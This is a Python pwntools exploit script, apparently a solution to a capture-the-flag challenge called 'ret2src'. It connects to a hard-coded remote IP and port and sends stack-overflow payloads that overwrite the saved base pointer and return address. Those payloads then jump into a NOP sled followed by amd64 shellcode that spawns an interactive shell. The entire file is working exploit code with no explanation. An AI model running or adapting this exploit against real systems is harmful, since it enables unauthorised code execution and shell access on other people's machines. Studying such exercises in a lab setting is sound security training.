#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./ret2src"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 6130)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x0400664
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

call_rbp = p64(0x0000000000400635) # call qword ptr [rbp + 0x48]
leave = p64(0x40069f)
get_again = p64(0x40063a)
rbp = elf.bss(0x400)

c.sendlineafter(' your text :', b'a' * 0x10 + p64(rbp) + get_again + asm('nop') * 0x60+ asm(pwnlib.shellcraft.amd64.linux.sh()))
c.sendlineafter(' your text :', b'a' * 0x10 + p64(rbp) + p64(rbp + 0x20) + asm('nop') * 0x60+ asm(pwnlib.shellcraft.amd64.linux.sh()))

c.interactive()
c.close()
